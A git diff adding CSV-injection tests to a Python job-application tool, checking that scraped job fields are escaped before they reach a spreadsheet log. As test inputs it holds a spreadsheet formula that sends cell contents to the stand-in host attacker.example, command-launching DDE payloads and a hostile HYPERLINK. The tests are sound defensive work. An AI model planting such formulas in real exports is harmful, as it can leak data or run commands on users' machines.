@@ -8,7 +8,14 @@ from pathlib import Path
 from typing import Any
 
 from applicant.models import Job
-from applicant.storage import APPLIED_COLUMNS, ApplicationLog, load_jobs, save_jobs
+from applicant.storage import (
+    APPLIED_COLUMNS,
+    ApplicationLog,
+    load_jobs,
+    neutralise,
+    restore,
+    save_jobs,
+)
 
 
 class TempDirTest(unittest.TestCase):
@@ -210,3 +217,92 @@ class ApplicationLogTest(TempDirTest):
 
 if __name__ == '__main__':
     unittest.main()
+
+
+class CsvInjectionTest(TempDirTest):
+    """OWASP CSV Injection: scraped text must reach the spreadsheet as text.
+
+    https://owasp.org/www-community/attacks/CSV_Injection
+    """
+
+    EXFILTRATE = '=IMPORTXML(CONCAT("https://attacker.example/?", A1), "//a")'
+
+    def record(self, **fields) -> str:
+        target = self.path('applied.csv')
+        job = Job(**{'source': 'indeed', 'id': '1', 'title': 'Dev', **fields})
+        ApplicationLog(target).record([(job, 'needs_manual_apply', 'apply directly')])
+        return target
+
+    def cells(self, target: str) -> dict[str, str]:
+        """The row exactly as a spreadsheet would parse it, escapes included."""
+        with open(target, encoding='utf-8-sig', newline='') as handle:
+            return next(iter(csv.DictReader(handle)))
+
+    def test_every_formula_start_is_escaped(self):
+        for start in ('=', '+', '-', '@', '＝', '＋', '－', '＠'):
+            with self.subTest(start=repr(start)):
+                self.assertEqual(neutralise(start + 'SUM(A1:A9)'), "'" + start + 'SUM(A1:A9)')
+        for control in ('\t', '\r', '\n'):
+            with self.subTest(start=repr(control)):
+                self.assertTrue(neutralise(control + '=1').startswith("'"))
+
+    def test_scraped_fields_are_written_as_text(self):
+        target = self.record(
+            title=self.EXFILTRATE,
+            company='+cmd|" /C calc"!A0',
+            location='@SUM(1+1)*cmd|" /C calc"!A0',
+            salary='-2+3+cmd|" /C calc"!A0',
+        )
+        row = self.cells(target)
+        for column in ('title', 'company', 'location', 'salary'):
+            with self.subTest(column=column):
+                self.assertTrue(row[column].startswith("'"), row[column])
+
+    def test_owasps_worked_examples(self):
+        """Quote all, double embedded quotes, prefix an apostrophe."""
+        for payload, expected in (
+            ('=1+2";=1+2', '"\'=1+2"";=1+2"'),
+            ('=1+2\'" ;,=1+2', '"\'=1+2\'"" ;,=1+2"'),
+        ):
+            with self.subTest(payload=payload):
+                target = self.record(title=payload)
+                raw = Path(target).read_text(encoding='utf-8-sig')
+                self.assertIn(expected, raw)
+                Path(target).unlink()
+
+    def test_a_separator_in_the_middle_cannot_open_a_new_cell(self):
+        target = self.record(title='Dev",=HYPERLINK("https://attacker.example")')
+        with open(target, encoding='utf-8-sig', newline='') as handle:
+            header, row = list(csv.reader(handle))
+        self.assertEqual(len(row), len(header))
+        self.assertEqual(row[header.index('title')], 'Dev",=HYPERLINK("https://attacker.example")')
+
+    def test_every_cell_is_quoted(self):
+        target = self.record()
+        header, row = Path(target).read_text(encoding='utf-8-sig').splitlines()
+        for line in (header, row):
+            with self.subTest(line=line[:20]):
+                self.assertTrue(line.startswith('"') and line.endswith('"'))
+
+    def test_reading_back_gives_the_original_values(self):
+        target = self.record(title=self.EXFILTRATE, company='-Acme')
+        row = ApplicationLog(target).rows()[0]
+        self.assertEqual(row['title'], self.EXFILTRATE)
+        self.assertEqual(row['company'], '-Acme')
+
+    def test_an_escaped_id_still_dedupes(self):
+        """The id round trips through the escape, so the posting is not logged twice."""
+        target = self.path('applied.csv')
+        log = ApplicationLog(target)
+        entry = (Job(source='googlejobs', id='-7f3a', title='Dev'), 'needs_manual_apply', 'x')
+        self.assertEqual(log.record([entry]), 1)
+        self.assertEqual(log.record([entry]), 0)
+
+    def test_ordinary_values_are_left_alone(self):
+        for value in ('Python Developer', "O'Reilly", '₹25K a month', None, -1.5, 42):
+            with self.subTest(value=value):
+                self.assertEqual(neutralise(value), value)
+                self.assertEqual(restore(value), value)
+
+    def test_an_apostrophe_the_data_really_starts_with_survives(self):
+        self.assertEqual(restore(neutralise("'quoted'")), "'quoted'")
